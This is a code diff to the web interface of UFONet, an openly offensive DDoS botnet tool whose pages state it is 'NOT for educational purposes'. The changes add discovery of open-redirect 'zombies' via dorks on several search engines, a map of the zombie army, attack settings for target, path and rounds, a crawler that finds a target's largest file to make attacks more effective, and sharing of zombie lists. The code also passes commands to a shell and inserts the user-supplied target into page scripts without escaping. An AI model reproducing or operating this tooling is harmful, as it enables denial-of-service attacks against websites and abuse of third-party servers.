@@ -1,7 +1,7 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS attacks via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)
+UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
@@ -27,6 +27,9 @@ class ClientThread(threading.Thread):
     def run(self):
         req = self.socket.recv(2048)
         res = self.pages.get(req)
+        if res is None:
+            self.socket.close()
+            return
         out = "HTTP/1.0 %s\r\n" % res["code"]
         out += "Content-Type: %s\r\n\r\n" % res["ctype"]
         out += "%s" % res["html"]
@@ -36,6 +39,41 @@ class ClientThread(threading.Thread):
             subprocess.Popen(res["run"], shell=True)
 
 class Pages():
+
+    def file_len(self, fn):
+        with open(fn) as f:
+            for i, l in enumerate(f):
+                pass
+        return i + 1
+
+    def html_army_map(self,target=None):
+        target_js="total_zombies = "+str(self.file_len('zombies.txt'))+"\ninitMap()\n\n"
+        if target is not None:
+            target_js += "$('#ufomsg').load('/js/ajax.js?doll="+target+"')\n"
+        return self.pages["/header"] + """
+  <link rel="stylesheet" href="/js/style.css" />
+  <link rel="stylesheet" href="/js/ajaxmap.css" />
+  <link rel="stylesheet" href="/js/leaflet/leaflet.css" />
+  <link rel="stylesheet" href="/js/cluster/MarkerCluster.Default.css"/>
+  <link rel="stylesheet" href="/js/cluster/MarkerCluster.css"/>
+  <script src="/js/leaflet/leaflet.js"></script>
+  <script src="/js/cluster/leaflet.markercluster-src.js"></script>
+  <script src="/js/jquery-1.10.2.min.js"></script>
+  <script src="/js/rlayer-src.js"></script>
+  <script src="/js/raphael.js"></script>
+  <script src="/js/ufo.js"></script>
+  <script src="/js/ajax.js"></script>
+</head><body bgcolor="black" text="black">
+  <div id="wrapper">
+      <div id="map" style="width: 100%; height: 100%"></div>
+  </div>
+<script type="text/javascript">
+window.onload = function(){
+"""+target_js+"""
+}
+  </script>
+<center>
+""" + self.pages["/footer"]      
 
     def html_request_submit(self):
         return self.pages["/header"]+"""<script>
@@ -50,10 +88,10 @@ window.setTimeout(window.close,1234)
                 data = json.load(data_file)
         except:
             if os.path.exists('webcfg.json') == True:
-                print '[Error] - Cannot open: webcfg.json. Change permissions to use WebGui correctly\n'
+                print '\n[Error] - Cannot open: webcfg.json. Change permissions to use WebGui correctly\n'
                 sys.exit(2)
             else: # generate default requests configuration file
-                print '[Error] - Cannot found: webcfg.json... Generating!\n'
+                print '\n[Info] - Cannot found: webcfg.json... Generating!\n'
                 with open('webcfg.json', "w") as f:
                     json.dump({"rproxy": "NONE", "ruseragent": "RANDOM", "rreferer": "RANDOM", "rhost": "NONE", "rxforw": "on", "rxclient": "on", "rtimeout": "10", "rretries": "1", "rdelay": "0", "threads": "5"}, f, indent=4)
         # set values of requests configuration from json file to html form
@@ -89,7 +127,7 @@ window.setTimeout(window.close,1234)
         return self.pages["/header"] + """
 <script language="javascript"> 
 function Requests() {
-        var win_requests = window.open("requests","_parent","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);;
+        var win_requests = window.open("requests","_parent","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
 </script>
 </head><body bgcolor="black" text="lime" style="font-family:Â Courier, 'Courier New', monospace;" ><center><pre>
@@ -145,10 +183,10 @@ function Requests() {
 
     def __init__(self):
         self.options = UFONetOptions()
+        self.mothership = UFONet()
         self.pages = {}
 
-        self.pages["/header"] = """
-<!DOCTYPE html><html>
+        self.pages["/header"] = """<!DOCTYPE html><html>
 <head>
 <link rel="icon" type="image/png" href="/favicon.ico" />
 <meta name="author" content="psy">
@@ -157,9 +195,8 @@ function Requests() {
 <title>UFONet: DDoS via WebAbuse</title>
 <script language="javascript" src="/lib.js"></script>
 <style>
-body{font-size:15px}a,a:hover{outline:none;color:lime;font-size:14px;font-weight:700}nav ul ul{display:none}nav ul li:hover > ul{display:block}nav ul{list-style:none;position:relative;display:inline-table}nav ul:after{content:"";clear:both;display:block}nav ul li{font-size:12px}nav ul li a{display:block;padding:2px 3px}html,body{height:100%}ul,li{margin:0;padding:0}.ringMenu{width:100px;margin:80px auto}.ringMenu ul{list-style:none;position:relative;width:100px;color:#fff}.ringMenu ul a{color:#fff}.ringMenu ul li{-webkit-transition:all .3s ease-in-out;-moz-transition:all .3s ease-in-out;-o-transition:all .3s ease-in-out;transition:all .3s ease-in-out}.ringMenu ul li a{display:block;width:100px;height:100px;background:rgba(50,50,50,0.7);text-align:center;line-height:100px;-webkit-border-radius:50px;-moz-border-radius:50px;border-radius:50px}.ringMenu ul li a:hover{background:rgba(230,150,20,0.7)}.ringMenu ul li:not(.main){-webkit-transform:rotate(-180deg) scale(0);-moz-transform:rotate(-180deg) scale(0);-o-transform:rotate(-180deg) scale(0);transform:rotate(-180deg) scale(0);opacity:0}.ringMenu:hover ul li{-webkit-transform:rotate(0) scale(1);-moz-transform:rotate(0) scale(1);-o-transform:rotate(0) scale(1);transform:rotate(0) scale(1);opacity:1}.ringMenu ul li.top{-webkit-transform-origin:50% 152px;-moz-transform-origin:50% 152px;-o-transform-origin:50% 152px;transform-origin:50% 152px;position:absolute;top:-102px;left:0}.ringMenu ul li.bottom{-webkit-transform-origin:50% -52px;-moz-transform-origin:50% -52px;-o-transform-origin:50% -52px;transform-origin:50% -52px;position:absolute;bottom:-102px;left:0}.ringMenu ul li.right{-webkit-transform-origin:-52px 50%;-moz-transform-origin:-52px 50%;-o-transform-origin:-52px 50%;transform-origin:-52px 50%;position:absolute;top:0;right:-102px}.ringMenu ul li.left{-webkit-transform-origin:152px 50%;-moz-transform-origin:152px 50%;-o-transform-origin:152px 50%;transform-origin:152px 50%;position:absolute;top:0;left:-102px}textarea{padding:30px 0}
-</style>
-"""
+body{font-size:15px}a,a:hover{outline:none;color:red;font-size:14px;font-weight:700}nav ul ul{display:none}nav ul li:hover > ul{display:block}nav ul{list-style:none;position:relative;display:inline-table}nav ul:after{content:"";clear:both;display:block}nav ul li{font-size:12px}nav ul li a{display:block;padding:2px 3px}html,body{height:100%}ul,li{margin:0;padding:0}.ringMenu{width:100px;margin:80px auto}.ringMenu ul{list-style:none;position:relative;width:100px;color:#fff}.ringMenu ul a{color:#fff}.ringMenu ul li{-webkit-transition:all .3s ease-in-out;-moz-transition:all .3s ease-in-out;-o-transition:all .3s ease-in-out;transition:all .3s ease-in-out}.ringMenu ul li a{display:block;width:100px;height:100px;background:rgba(50,50,50,0.7);text-align:center;line-height:100px;-webkit-border-radius:50px;-moz-border-radius:50px;border-radius:50px}.ringMenu ul li a:hover{background:rgba(230,150,20,0.7)}.ringMenu ul li:not(.main){-webkit-transform:rotate(-180deg) scale(0);-moz-transform:rotate(-180deg) scale(0);-o-transform:rotate(-180deg) scale(0);transform:rotate(-180deg) scale(0);opacity:0}.ringMenu:hover ul li{-webkit-transform:rotate(0) scale(1);-moz-transform:rotate(0) scale(1);-o-transform:rotate(0) scale(1);transform:rotate(0) scale(1);opacity:1}.ringMenu ul li.top{-webkit-transform-origin:50% 152px;-moz-transform-origin:50% 152px;-o-transform-origin:50% 152px;transform-origin:50% 152px;position:absolute;top:-102px;left:0}.ringMenu ul li.bottom{-webkit-transform-origin:50% -52px;-moz-transform-origin:50% -52px;-o-transform-origin:50% -52px;transform-origin:50% -52px;position:absolute;bottom:-102px;left:0}.ringMenu ul li.right{-webkit-transform-origin:-52px 50%;-moz-transform-origin:-52px 50%;-o-transform-origin:-52px 50%;transform-origin:-52px 50%;position:absolute;top:0;right:-102px}.ringMenu ul li.left{-webkit-transform-origin:152px 50%;-moz-transform-origin:152px 50%;-o-transform-origin:152px 50%;transform-origin:152px 50%;position:absolute;top:0;left:-102px}textarea{padding:30px 0}
+</style>"""
 
         self.pages["/footer"] = """</center></body>
 </html>
@@ -171,21 +208,145 @@ body{font-size:15px}a,a:hover{outline:none;color:lime;font-size:14px;font-weight
  
         self.pages["/"] = self.pages["/header"] + """<script language="javascript">
       function Start() {
-        var win_start = window.open("gui","_parent","fulscreen=yes, titlebar=yes, top=180, left=320, width=640, height=460, resizable=yes", false);
+        var win_start = window.open("gui","_parent","fullscreen=yes, titlebar=yes, top=180, left=320, width=640, height=460, resizable=yes", false);
       }
 </script>
+<script type="text/javascript">
+// <![CDATA[
+var speed=15; // how fast - smaller is faster
+var how_often=5; // average time between re-appearances of a comet (in seconds)
+var how_many=10; // maximum number of comets in flight
+var colours=new Array("#ff0", "#f93", "#f60", "#e93", "#e94", "#da5", "#da6", "#cb7", "#cb8", "#cc9", "#dcb", "#ddd");  
+var dx=new Array();
+var dy=new Array();
+var xpos=new Array();
+var ypos=new Array();
+var comets=new Array();
+var swide=800;
+var shigh=600;
+var tail=colours.length;
+var boddie=false;
+
+function addLoadEvent(funky) {
+  var oldonload=window.onload;
+  if (typeof(oldonload)!='function') window.onload=funky;
+  else window.onload=function() {
+    if (oldonload) oldonload();
+    funky();
+  }
+}
+
+addLoadEvent(whooosh);
+
+function whooosh() { if (document.getElementById) {
+  var i;
+  boddie=document.createElement("div");
+  boddie.style.position="fixed";
+  boddie.style.top="0px";
+  boddie.style.left="0px";
+  boddie.style.overflow="visible";
+  boddie.style.width="1px";
+  boddie.style.height="1px";
+  boddie.style.backgroundColor="transparent";
+  document.body.appendChild(boddie);
+  set_width();
+  for (i=0; i<how_many; i++) {
+    write_comet(i*tail);
+	setTimeout('launch('+(i*tail)+')', Math.max(1000*i));
+  }
+}}
+
+function write_comet(a) {
+  var i, s;
+  for (i=0; i<tail; i++) {
+    s=2+(i<tail/4)+2*!i;
+	comets[i+a]=div(s, s);
+	comets[i+a].style.backgroundColor=colours[i];
+	boddie.appendChild(comets[i+a]);
+  }
+}
+
+function div(w, h) {
+  var d=document.createElement("div");
+  d.style.position="absolute";
+  d.style.overflow="hidden";
+  d.style.width=w+"px";
+  d.style.height=h+"px";
+  return (d);
+}
+
+function stepthrough(a) { 
+  var i;
+  if (Math.random()<0.008||ypos[a]+dy[a]<5||xpos[a]+dx[a]<5||xpos[a]+dx[a]>=swide-5||ypos[a]+dy[a]>=shigh-5) {
+	for (i=0; i<tail; i++) setTimeout('comets['+(i+a)+'].style.visibility="hidden"', speed*(tail-i));
+	setTimeout('launch('+a+')', Math.max(1000, 2000*Math.random()*how_often));
+  }
+  else setTimeout('stepthrough('+a+')', speed);
+  for (i=tail-1; i>=0; i--) {
+	if (i) {
+      xpos[i+a]=xpos[i+a-1];
+      ypos[i+a]=ypos[i+a-1];
+	}
+	else {
+	  xpos[i+a]+=dx[a];
+      ypos[i+a]+=dy[a];
+	}
+    comets[i+a].style.left=xpos[i+a]+"px";
+    comets[i+a].style.top=ypos[i+a]+"px";
+  }
+} 
+
+function launch(a) {
+  var i;
+  dx[a]=(Math.random()>0.5?1:-1)*(1+Math.random()*3);
+  dy[a]=(Math.random()>0.5?1:-1)*((7-dx[a])/3+Math.random()*(dx[a]+5)/3);
+  xpos[a]=2*tail*dx[a]+Math.round(Math.random()*(swide-4*tail*dx[a]));
+  ypos[a]=2*tail*dy[a]+Math.round(Math.random()*(shigh-4*tail*dy[a]));
+  for (i=0; i<tail; i++) {
+    xpos[i+a]=xpos[a];
+    ypos[i+a]=ypos[a];
+	comets[i+a].style.visibility="visible";
+  }
+  stepthrough(a);
+}
+
+window.onresize=set_width;
+function set_width() {
+  var sw_min=999999;
+  var sh_min=999999;
+  if (document.documentElement && document.documentElement.clientWidth) {
+    if (document.documentElement.clientWidth>0) sw_min=document.documentElement.clientWidth;
+    if (document.documentElement.clientHeight>0) sh_min=document.documentElement.clientHeight;
+  }
+  if (typeof(self.innerWidth)!="undefined" && self.innerWidth) {
+    if (self.innerWidth>0 && self.innerWidth<sw_min) sw_min=self.innerWidth;
+    if (self.innerHeight>0 && self.innerHeight<sh_min) sh_min=self.innerHeight;
+  }
+  if (document.body.clientWidth) {
+    if (document.body.clientWidth>0 && document.body.clientWidth<sw_min) sw_min=document.body.clientWidth;
+    if (document.body.clientHeight>0 && document.body.clientHeight<sh_min) sh_min=document.body.clientHeight;
+  }
+  if (sw_min==999999 || sh_min==999999) {
+    sw_min=800;
+    sh_min=600;
+  }
+  swide=sw_min;
+  shigh=sh_min;
+}
+// ]]>
+</script>
 </head>
-<body bgcolor="white" text="black" style="font-family: Courier, 'Courier New', monospace;" >
+<body bgcolor="lime" text="black" style="font-family: Courier, 'Courier New', monospace;" >
 <center><br />
 <img src="/ufonet-logo.png">
 <br /><br />
 <hr>
 UFONet - is a tool designed to launch <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> attacks against a target,<br /> 
   using 'Open Redirect' vectors on third party web applications, like <a href="https://en.wikipedia.org/wiki/Botnet" target="_blank">botnet</a>.<br /><br />
-<button onclick="Start()">START INTERFACE!</button>
+<button onclick="Start()">START MOTHERSHIP!</button>
 <br /><br /><hr>
 "This code is NOT for educational purposes"<br /><br />
-Project: <a href="http://ufonet.sf.net" target="_blank">http://ufonet.sf.net</a>
+Project: <a href="http://ufonet.03c8.net" target="_blank">http://ufonet.03c8.net</a>
 """ + self.pages["/footer"]
 
         self.pages["/gui"] = self.pages["/header"] + """</head>
@@ -196,7 +357,7 @@ Project: <a href="http://ufonet.sf.net" target="_blank">http://ufonet.sf.net</a>
  <td>
 <div class="ringMenu">
 <ul>
-  <li class="main"><a href="gui">Menu</a></li>
+  <li class="main"><a target="_blank" href="wormhole">Wormhole</a></li>
   <li class="top"><a href="botnet">Botnet</a></li>
   <li class="right"><a href="inspect">Inspect</a></li>
   <li class="bottom"><a href="attack">Attack</a></li>
@@ -208,6 +369,9 @@ Project: <a href="http://ufonet.sf.net" target="_blank">http://ufonet.sf.net</a>
 <pre>
 Welcome to <a href="https://twitter.com/search?f=realtime&q=ufonet&src=sprv" target="_blank">#UFONet</a> DDoS via WebAbuse Botnet Manager... ;-)
 """ + self.options.version + """
+-----------------------------------
+
+Mothership ID: '""" + str(base64.b64decode(self.mothership.mothership_id)) + """'
 </pre> 
  </td>
 </tr>
@@ -218,18 +382,34 @@ Welcome to <a href="https://twitter.com/search?f=realtime&q=ufonet&src=sprv" tar
 function Requests() {
         var win_requests = window.open("requests","_blank","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
+function Maps() {
+        var win_map = window.open("cmd_view_army","_blank","fulscreen=yes, resizable=yes", false);
+        win_map.resizeTo(screen.width,screen.height);
+      }
 function Start(){
         dork=document.getElementById("dork").value
+        s_engine = document.getElementById('engines_list').options[document.getElementById('engines_list').selectedIndex].text;
         if (document.getElementById("dork_list").checked){
         document.getElementById("dork_list").value = "on";
         } else {
         document.getElementById("dork_list").value = "off";
         }
         dork_list = document.getElementById("dork_list").value
-        num_results=document.getElementById("num_results").value
-        params="dork="+escape(dork)+"&dork_list="+escape(dork_list)+"&num_results="+escape(num_results)
-        runCommandX("cmd_search",params)
-}
+        if(dork == "" || dork_list.value == "off") {
+          window.alert("You need to enter a source for dorking (from: parameter or file)");
+          return
+         }else{
+          if (document.getElementById("all_engines").checked){
+          document.getElementById("all_engines").value = "on";
+          } else {
+          document.getElementById("all_engines").value = "off";
+          }
+          all_engines = document.getElementById("all_engines").value
+          num_results=document.getElementById("num_results").value
+          params="dork="+escape(dork)+"&dork_list="+escape(dork_list)+"&s_engine="+escape(s_engine)+"&all_engines="+escape(all_engines)+"&num_results="+escape(num_results)
+        runCommandX("cmd_search",params)      
+         }
+      }
 
 function showHide() 
      {
@@ -239,6 +419,16 @@ function showHide()
         } 
         else {
          document.getElementById("dork_pattern").style.display = "";
+        }
+     }
+function showHideEngines()
+     {
+        if(document.getElementById("all_engines").checked)
+        {
+         document.getElementById("s_engine").style.display = "none";
+        }
+        else {
+         document.getElementById("s_engine").style.display = "";
         }
      }
 </script>
@@ -261,23 +451,29 @@ function showHide()
  </td>
  <td>
 <pre>
- <u>Manage Botnet</u>: <button onclick="Requests()">Configure requests</button> 
+ <u>Manage Botnet</u>: <button onclick="Requests()">Configure requests</button>
 
-<hr>
-  * Your Army: <a href='javascript:runCommandX("cmd_list_army")'>List</a>  |  <a href='javascript:runCommandX("cmd_test_army")'>Test!</a>
-<form method='GET'>
-<hr>
+  <a href='javascript:runCommandX("cmd_list_army")'>List 'zombies'</a> | <button onclick="Maps()">View!</button>
+<form method='GET'><hr>
   * Search for 'zombies':
-    <div id="dork_pattern" style="display:block;">    + Using a dork <input type="text" name="dork" id="dork" size="20" placeholder="proxy.php?url="></div>
+    <div id="dork_pattern" style="display:block;">    + Using a dork: <input type="text" name="dork" id="dork" size="20" placeholder="proxy.php?url="></div>
     + Using a list (from: dorks.txt) <input type="checkbox" id="dork_list" onchange="showHide()">
+    <div id="s_engine" name="s_engine" style="display:block;">    + Using this search engine: <select id="engines_list">
+  <option value="duck" selected>duck</option>
+  <option value="google">google</option>
+  <option value="bing">bing</option>
+  <option value="yahoo">yahoo</option>
+  <option value="yandex">yandex</option>
+  </select></div>
+    + Using all search engines <input type="checkbox" name="all_engines" id="all_engines" onchange="showHideEngines()">
 
-    + Max num of result <input type="text" name="num_results" id="num_results" size="5" value="10">
+    + Max num of results: <input type="text" name="num_results" id="num_results" size="5" value="10">
 </form>
+  <button onClick=Start()>Search</button>
 <hr>
-  <button onClick=Start()>Search</button></pre>
-</td>
-</tr>
-</table>
+  * Test Botnet: <a href='javascript:runCommandX("cmd_test_army")'>Status</a> | <a href='javascript:runCommandX("cmd_attack_me")'>Attack-Me?!</a>
+<hr>
+  * Community: <a href='javascript:runCommandX("cmd_upload_community")'>Upload</a> | <a href='javascript:runCommandX("cmd_download_community")'>Download</a></td></tr></table>
 <hr>
 <div id="cmdOut"></div>
 """ + self.pages["/footer"]
@@ -286,11 +482,44 @@ function showHide()
 function Requests() {
         var win_requests = window.open("requests","_blank","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
+function Maps() {
+         var win_map = window.open("/cmd_view_attack?target="+target,"_blank","fulscreen=yes, resizable=yes", false);
+         win_map.resizeTo(screen.width,screen.height);
+      }
+
 function Start(){
 	target=document.getElementById("target").value
-	path  =document.getElementById("path").value
-	rounds=document.getElementById("rounds").value
-	params="target="+escape(target)+"&path="+escape(path)+"&rounds="+escape(rounds)
+        String.prototype.startsWith = function(prefix){
+        return this.indexOf(prefix) === 0;
+        }
+        if(target.startsWith("http")){
+             path=document.getElementById("path").value
+             rounds=document.getElementById("rounds").value
+             if (document.getElementById("disable_aliens").checked){
+                document.getElementById("disable_aliens").value = "on";
+             } else {
+                document.getElementById("disable_aliens").value = "off";
+             }
+             disable_aliens = document.getElementById("disable_aliens").value
+             if (document.getElementById("disable_isup").checked){
+                document.getElementById("disable_isup").value = "on";
+             } else {
+                document.getElementById("disable_isup").value = "off";
+             }
+             disable_isup = document.getElementById("disable_isup").value
+             params="path="+escape(path)+"&rounds="+escape(rounds)+"&target="+escape(target)+"&disable_aliens="+escape(disable_aliens)+"&disable_isup="+escape(disable_isup)
+             if (document.getElementById("visual_attack").checked){
+                document.getElementById("visual_attack").value = "on";
+             } else {
+                document.getElementById("visual_attack").value = "off";
+             }
+             if(document.getElementById("visual_attack").value=="on"){
+                Maps() 
+             }
+        }else{
+          window.alert("You need to enter a valid url: http(s)://target.com");
+          return
+        }
 	runCommandX("cmd_attack",params)
 }
 </script>
@@ -314,14 +543,19 @@ function Start(){
 <pre>
  <u>Attacking:</u>
 
-  * Set your target    <input type="text" name="target" id="target" size="30" placeholder="http(s)://">
+  * Set your target:     <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">
 
-  * Set place to 'bit' <input type="text" name="path" id="path" size="30" placeholder="/path/big.jpg">
+  * Set place to attack: <input type="text" name="path" id="path" size="30" placeholder="/path/big.jpg">
 
-  * Number of rounds   <input type="text" name="rounds" id="rounds" size="5" value="1">
+  * Number of rounds:    <input type="text" name="rounds" id="rounds" size="5" value="1">
+
+  <input type="checkbox" name="disable_aliens" id="disable_aliens"> Disable 'aliens' <input type="checkbox" name="disable_isup" id="disable_isup"> Disable 'is target up?'
 
 <hr>
-  <button onclick="Requests()">Configure requests</button> 
+  <button onclick="Requests()">Configure requests</button>
+
+<hr> 
+  <input type="checkbox" name="visual_attack" id="visual_attack"> Generate map
 
 <hr>
   <button onClick=Start()>START!</button></pre>
@@ -367,23 +601,22 @@ function show(one) {
  <td>
 <pre>
  <div><a id="mH1" href="javascript:show('nb1');" style="text-decoration: none;" >+ Project info</a></div><div class="nb" id="nb1" style="display: none;">
-  UFONet - is a tool designed to launch <u>automatic DDoS attacks</u> using a botnet
+  UFONet - is a tool designed to launch a Layer 7 (HTTP/Web Abuse) DDoS attack against a target.
 
-  Development began in: 2013
+  - Development began in: 2013
 
   It is written in <a href="https://www.python.org/" target="_blank">python</a> and distributed under license <a href="http://gplv3.fsf.org/" target="_blank">GPLv3</a>
 
-   + Main project website: <a href="http://ufonet.sf.net" target="_blank">http://ufonet.sf.net</a>
+   + Website: <a href="http://ufonet.03c8.net" target="_blank">http://ufonet.03c8.net</a>
+
    + Forum threads: <a href="https://forum.unsystem.net/category/churchofsecurity/ufonet" target="_blank">http://forum.unsystem.net</a></div> <div><a id="mH2" href="javascript:show('nb2');" style="text-decoration: none;" >+ How does it work?</a></div> <div class="nb" id="nb2" style="display: none;">  It works exploiting "Open Redirect" vectors on third party web applications.
 
-  You can read some info about what exploits on next links:
+  You can read more info on next links:
 
      - <a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank">CWE-601:Open Redirect</a>
      - <a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2" target="_blank">OWASP:URL Redirector Abuse</a>
 
-  You have a technical schema about an attacking scenario: <a href="http://ufonet.sf.net/ufonet/ufonet-schema.png" target="_blank">here</a>
-
-  Also, you can follow <a href="http://ufonet.sourceforge.net/ufonet/UFONet-v0.3-Abduction-English-GSICK.pdf" target="_blank">this link</a> to view some slides created on 2014</div> <div><a id="mH3" href="javascript:show('nb3');" style="text-decoration: none;" >+ How to start?</a></div> <div class="nb" id="nb3" style="display: none;">  All you need to start an attack is:
+  And review this technical schema: <a href="http://ufonet.03c8.net/ufonet/ufonet-schema.png" target="_blank">here</a></div> <div><a id="mH3" href="javascript:show('nb3');" style="text-decoration: none;" >+ How to start?</a></div> <div class="nb" id="nb3" style="display: none;">  All you need to start an attack is:
    
       - a proxy (not required); to mask the origin of the attack (ex: <a href="https://www.torproject.org/" target="_blank">Tor</a>)
       - a list of 'zombies'; to conduct their connections to your target
@@ -402,12 +635,11 @@ To check your version you should launch, from shell:
       - Donating; money, objects, support, love ;-)
 
          + Bitcoin: 1Q63KtiLGzXiYA8XkWFPnWo7nKPWFr3nrc
-         + Ecoin: 6enjPY7PZVq9gwXeVCxgJB8frsf4YFNzVp</div> <div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none" >+ Contact forms</a></div> <div class="nb" id="nb6" style="display: none;">  You can contact using:
+         + Ecoin: 6enjPY7PZVq9gwXeVCxgJB8frsf4YFNzVp</div> <div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none" >+ Contact methods</a></div> <div class="nb" id="nb6" style="display: none;">  You can contact using:
    
       - Email: <a href="mailto: epsylon@riseup.net">epsylon@riseup.net</a> [GPG:0xB8AC3776]
 
-      - IRC: irc.freenode.net / #ufonet
-      - Twitter: <a href="https://twitter.com/psytzsche" target="_blank">@psytzsche</a></div></pre>
+      - IRC: irc.freenode.net / #ufonet</div></pre>
  </td>
 </tr>
 </table>
@@ -417,9 +649,19 @@ To check your version you should launch, from shell:
 function Requests() {
         var win_requests = window.open("requests","_blank","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
+
 function Start(){
         target=document.getElementById("target").value
+        String.prototype.startsWith = function(prefix){
+        return this.indexOf(prefix) === 0;
+        }
+        if(target.startsWith("http")){
         params="target="+escape(target)
+
+        }else{
+          window.alert("You need to enter a valid url: http(s)://target.com/page.html");
+          return
+        }
         runCommandX("cmd_inspect",params)
 }
 </script>
@@ -444,8 +686,11 @@ function Start(){
 <pre>
  <u>Inspect for places</u>: <button onclick="Requests()">Configure requests</button> 
 
+  This feature will provides you the biggest file on target. 
+  You can use this when attacking to be more effective.
+
 <hr>
-  * Set URL <input type="text" name="target" id="target" size="30" placeholder="http(s)://">
+  * Set page to crawl: <input type="text" name="target" id="target" size="30" placeholder="http(s)://target.com/list_videos.php">
 
 <hr>
    <button onClick=Start()>START!</button></pre>
@@ -496,10 +741,10 @@ function runCommandX(cmd,params) {
                                 document.getElementById("cmdOut").innerHTML = xmlhttp.responseText;
                                 //document.getElementById("cmdOut").scrollIntoView();
                                 newcmd=cmd
-                                if(newcmd=="cmd_list_army") { //do not refresh listing army
+                                if(newcmd=="cmd_list_army"||newcmd=="cmd_view_army"){ //do not refresh listing army
                                     return;
                                 } else {
-                                if(newcmd=="cmd_test_army" || newcmd=="cmd_attack" || newcmd=="cmd_inspect" || newcmd=="cmd_search") newcmd=newcmd+"_update"
+                                if(newcmd=="cmd_test_army" || newcmd=="cmd_attack" || newcmd=="cmd_inspect" || newcmd=="cmd_download_community" || newcmd=="cmd_upload_community" || newcmd=="cmd_attack_me" || newcmd=="cmd_search") newcmd=newcmd+"_update"
 								//do not refresh if certain text on response is found
 								if(newcmd.match(/update/) && 
 										(
@@ -533,6 +778,12 @@ function runCommandX(cmd,params) {
             path = path[0]
             start = path.find("?")
             if start != -1:
+                if path[start+1:start+7] == "zombie":
+                    params['zombie']=path[start+8:]
+                    return params
+                if path[start+1:start+7] == "target":
+                    params['target']=path[start+8:]
+                    return params
                 for param in path[start+1:].split("&"):
                     f = param.split("=")
                     if len(f) == 2:
@@ -544,57 +795,56 @@ function runCommandX(cmd,params) {
         return params
 
     def save_cfg(self,pGet):
-            # set values of requests configuration from html form to json file
-            if "rproxy" in pGet.keys():
-                frm_rproxy = pGet["rproxy"]
+        # set values of requests configuration from html form to json file
+        if "rproxy" in pGet.keys():
+            frm_rproxy = pGet["rproxy"]
+        else:
+            frm_rproxy = self.rproxy
+        if "ruseragent" in pGet.keys():
+            frm_ruseragent = pGet["ruseragent"]
+        else:
+            frm_ruseragent = self.ruseragent
+        if "rreferer" in pGet.keys():
+            frm_rreferer = pGet["rreferer"]
+        else:
+            frm_rreferer = self.rreferer
+        if "rhost" in pGet.keys():
+            frm_rhost = pGet["rhost"]
+        else:
+            frm_rhost = self.rhost
+        if "rxforw" in pGet.keys():
+            frm_rxforw = pGet["rxforw"]
+        else:
+            if "update" in pGet.keys():
+                frm_rxforw = ""
             else:
-                frm_rproxy = self.rproxy
-            if "ruseragent" in pGet.keys():
-                frm_ruseragent = pGet["ruseragent"]
+                frm_rxforw = self.rxforw
+        if "rxclient" in pGet.keys():
+            frm_rxclient = pGet["rxclient"]
+        else:
+            if "update" in pGet.keys():
+                frm_rxclient = ""
             else:
-                frm_ruseragent = self.ruseragent
-            if "rreferer" in pGet.keys():
-                frm_rreferer = pGet["rreferer"]
-            else:
-                frm_rreferer = self.rreferer
-            if "rhost" in pGet.keys():
-                frm_rhost = pGet["rhost"]
-            else:
-                frm_rhost = self.rhost
-            if "rxforw" in pGet.keys():
-                frm_rxforw = pGet["rxforw"]
-            else:
-                if "update" in pGet.keys():
-                    frm_rxforw = ""
-                else:
-                    frm_rxforw = self.rxforw
-            if "rxclient" in pGet.keys():
-                frm_rxclient = pGet["rxclient"]
-            else:
-                if "update" in pGet.keys():
-                    frm_rxclient = ""
-                else:
-                    frm_rxclient = self.rxclient
-            if "rtimeout" in pGet.keys():
-                frm_rtimeout = pGet["rtimeout"]
-            else:
-                frm_rtimeout = self.rtimeout
-            if "rretries" in pGet.keys():
-                frm_rretries = pGet["rretries"]
-            else:
-                frm_rretries = self.rretries
-            if "rdelay" in pGet.keys():
-                frm_rdelay = pGet["rdelay"]
-            else:
-                frm_rdelay = self.rdelay
-            if "threads" in pGet.keys():
-                frm_threads = pGet["threads"]
-            else:
-                frm_threads = self.threads
-            # set new values on cfg json file 
-            with open('webcfg.json', "w") as f:
-                json.dump({"rproxy": frm_rproxy, "ruseragent": frm_ruseragent, "rreferer": frm_rreferer, "rhost": frm_rhost, "rxforw": frm_rxforw, "rxclient": frm_rxclient, "rtimeout": frm_rtimeout, "rretries": frm_rretries, "rdelay": frm_rdelay, "threads":frm_threads}, f, indent=4)
-
+                frm_rxclient = self.rxclient
+        if "rtimeout" in pGet.keys():
+            frm_rtimeout = pGet["rtimeout"]
+        else:
+            frm_rtimeout = self.rtimeout
+        if "rretries" in pGet.keys():
+            frm_rretries = pGet["rretries"]
+        else:
+            frm_rretries = self.rretries
+        if "rdelay" in pGet.keys():
+            frm_rdelay = pGet["rdelay"]
+        else:
+            frm_rdelay = self.rdelay
+        if "threads" in pGet.keys():
+            frm_threads = pGet["threads"]
+        else:
+            frm_threads = self.threads
+        # set new values on cfg json file 
+        with open('webcfg.json', "w") as f:
+            json.dump({"rproxy": frm_rproxy, "ruseragent": frm_ruseragent, "rreferer": frm_rreferer, "rhost": frm_rhost, "rxforw": frm_rxforw, "rxclient": frm_rxclient, "rtimeout": frm_rtimeout, "rretries": frm_rretries, "rdelay": frm_rdelay, "threads":frm_threads}, f, indent=4)
 
     def get(self, request):
         # set request options of the user
@@ -606,7 +856,7 @@ function runCommandX(cmd,params) {
         cmd_options = cmd_options + " --force-yes" # no raw_input allowed on webgui
         runcmd = ""
         res = re.findall("^GET ([^\s]+)", request)
-        if res is None:
+        if res is None or len(res)==0:
             return
         pGet = {}
         page = res[0]
